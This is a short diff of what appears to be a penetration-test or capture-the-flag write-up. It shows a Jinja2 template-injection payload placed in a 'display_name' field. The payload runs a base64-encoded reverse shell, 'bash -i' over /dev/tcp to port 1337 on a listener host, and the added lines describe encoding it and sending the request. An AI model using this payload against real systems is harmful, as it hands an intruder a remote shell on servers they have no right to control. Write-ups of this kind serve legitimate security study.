@@ -280,4 +280,7 @@ Priority: u=0, i
 display_name={{ self.__init__.__globals__.__builtins__.__import__('os').popen('YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMDAuODMuMjU1LzEzMzcgMD4mMQ== | base64 -d | bash').read() }}
 ```
 
-Ill put the base64 encoded payload in, then base64 de
+Ill put the base64 encoded payload in, then base64 decode it then run it with bash
+
+Ill URL encode the full string and send the request
+
